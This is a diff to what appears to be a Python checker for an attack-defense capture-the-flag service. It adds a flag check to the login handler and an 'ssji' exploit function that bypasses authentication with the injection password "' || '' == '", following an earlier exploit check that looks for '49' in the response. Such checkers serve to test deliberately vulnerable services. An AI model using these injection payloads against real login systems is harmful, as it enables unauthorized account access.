@@ -21,6 +21,9 @@ def ping(host):
 
 @srv.put("auth")
 def login(host, flag):
+    r = requests.get(f"{schema}://{host}:{port}/{flag}")
+    if flag not in r.text:
+        return 0
     password = gen_password(20)
     s = requests.Session()
     s.post(f"{schema}://{host}:{port}/",data={"login": flag, "passwd": password, "action": "signup"})
@@ -56,6 +59,17 @@ def exploit(host):
     if "49" in req.text:
         return 1
     return 0
+
+@srv.exploit("ssji")
+def exploit(host):
+    password = gen_password(20)
+    s = requests.Session()
+    s.post(f"{schema}://{host}:{port}/",data={"login": "client1337", "passwd": password, "action": "signup"})
+    r = s.post(f"{schema}://{host}:{port}", data={"login": "client1337", "passwd": "' || '' == '", "action": "signin"})
+    soup = BeautifulSoup(r.text, "html.parser")
+    req = soup.find("h4", class_="checker")
+    if 'client1337' in req.text:
+        return 1
 
     
 if __name__ == "__main__":
